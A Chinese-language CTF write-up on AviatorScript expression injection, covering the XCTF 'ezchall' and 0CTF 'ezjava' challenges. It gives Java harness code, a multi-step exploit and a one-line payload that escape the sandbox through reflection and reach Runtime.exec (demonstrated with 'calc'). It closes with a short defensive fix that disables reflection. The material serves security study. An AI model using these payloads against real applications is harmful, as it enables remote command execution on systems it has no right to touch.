**AviatorScript 表达式注入**

## 参考

来自于啊韬师傅的分享

## 附件

[ezchall.jar](https://www.yuque.com/attachments/yuque/0/2023/jar/25358086/1702608715217-c3de6f96-0810-4ffd-95e1-23e4f11e801a.jar)

## 分析

#### XCTF - ezchall

22年赛宁夏令营的一道题，具体实现代码可以查看附件
沙盒设置了两层防护：
1设置仅支持的语法特性：赋值、for循环、while循环、匿名函数lambda定义、局部变量
2禁止任何 class
根据文档(https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#azo1K)可知，还有反射可以进行利用，从而获取所需的各种类。如：对应`class java.lang.Class`->`getClass(getClass(''))`
但是这个反射只能获取`非static修饰的公共方法`，具体过滤代码如下

![](https://cdn.nlark.com/yuque/0/2023/png/25358086/1702608716458-c347fe5b-440a-481e-a288-9e744b49fc39.png#averageHue=%232d2c2c&id=gPRpH&originHeight=868&originWidth=2158&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

此时则无法利用表达式的反射形式调用`forName`方法，需要通过自己构造反射进行利用。
通过`getDeclaredMethods()`获取到`forName`方法

```java
getDeclaredMethods(getClass(getClass('')))[1]
```

通过`getDeclaredMethod(String method, Class[] classes)`获取到`forName`方法
关键在于获取Class数组，AviatorScript倒是提供`seq.array_of`用于创建数组，但是因为禁止任何Class的缘故无法使用该函数。在查看Class可调用的方法时找到了`getInterfaces()`、`getDeclaredClasses()`、`getClasses()`是可以返回Class数组
找到`java.util.Map`接口类刚好返回大小为1的Class数组，于是有如下操作（也刚好这里语法特性支持赋值)

```java
c1 = getDeclaredClasses(getInterfaces(getClass(seq.map(1,1)))[0]);
c1[0] = getClass('');
```

除了上面两种方式，其实还想过利用`ClassLoader#loadClass`方法获取`Class`，但是找了几个类调用`getClassLoader()`获取的都是`null`（猜测这里应该都是取到`Bootstrap ClassLoader`，没有找到能够利用的类遂放弃）
Object数组可以利用`tuple()`得到

##### **Code**

```java
package com.example.ctf;

import com.googlecode.aviator.AviatorEvaluatorInstance;
import com.googlecode.aviator.Feature;
import com.googlecode.aviator.Options;
import com.googlecode.aviator.script.AviatorScriptEngine;

import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.util.HashSet;

public class Test {
    public static void main(String[] args) throws ScriptException {
        String s = "c = getInterfaces(getClass(seq.map(1,1)));\n" +
                "c1 = getClasses(c[0]);\n" +
                "c1[0] = getClass('');\n" +
                "c2 = getClass(getClass(''));\n" +
                "m = getDeclaredMethod(c2, \"forName\", c1);\n" +
                "r = invoke(m, c2, tuple('java.lang.Runtime'));\n" +
                "m1 = getDeclaredMethod(r, \"getRuntime\", getClasses(getClass('')));\n" +
                "r1 = invoke(m1, r, tuple());\n" +
                "m2 = getDeclaredMethod(r, \"exec\", c1);\n" +
                "invoke(m2, r1, tuple(\"calc\"));";
        ScriptEngineManager sem = new ScriptEngineManager();
        AviatorScriptEngine engineByName = (AviatorScriptEngine) sem.getEngineByName("AviatorScript");
        AviatorEvaluatorInstance instance = engineByName.getEngine();
        instance.setOption(Options.FEATURE_SET, Feature.asSet(Feature.Assignment, Feature.ForLoop, Feature.WhileLoop, Feature.Lambda, Feature.Let));
        HashSet<Object> classes = new HashSet<>();
        instance.setOption(Options.ALLOWED_CLASS_SET, classes);
        engineByName.eval(s);
    }
}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25358086/1702608716616-8fc1474c-72ec-45cd-9d38-e054c7ee6d8e.png#averageHue=%23626262&id=F554a&originHeight=1332&originWidth=2467&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

##### **EXP**

```java
c = getInterfaces(getClass(seq.map(1,1))); 
c1 = getDeclaredClasses(c[0]);
c1[0] = getClass('');
c2 = getClass(getClass(''));
m = getDeclaredMethod(c2, "forName", c1);
r = invoke(m, c2, tuple('java.lang.Runtime'));
m1 = getDeclaredMethod(r, "getRuntime", getClasses(getClass('')));
r1 = invoke(m1, r, tuple());
exec(r1, "calc");
```

#### **0CTF - ezjava**

仅给出表达式部分内容
与上面那道题目不同的地方，该题进一步限制语法特性，导致第一题中赋值部分的操作就不行了，得把他们合到一句中

```java
exec(invoke(getMethod(invoke(getMethods(getClass(getClass('')))[0],getClass(getClass('')),tuple('java.lang.Runtime')),"getRuntime",getClasses(getClass(''))),tuple(),tuple()),"calc")
```

## **防御手段**

若使用过程中不会使用到反射特性，使用如下代码关闭反射

```java
instance.setFunctionMissing(null);
```
